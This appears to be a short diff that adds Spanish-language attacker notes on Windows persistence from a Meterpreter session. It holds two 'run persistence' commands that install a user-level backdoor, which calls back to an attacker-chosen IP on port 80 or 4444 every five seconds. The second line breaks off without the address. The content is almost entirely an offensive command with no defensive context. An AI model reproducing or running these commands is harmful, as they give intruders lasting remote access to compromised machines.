@@ -1,0 +1,2 @@
+persistencia windows comando para persistencia para windows desde la session de meterpreter =  run persistence -U -i 5 -p 80 -r (ip)   
+                                                                       =  run persistence -U -i 5 -p 4444 -r 
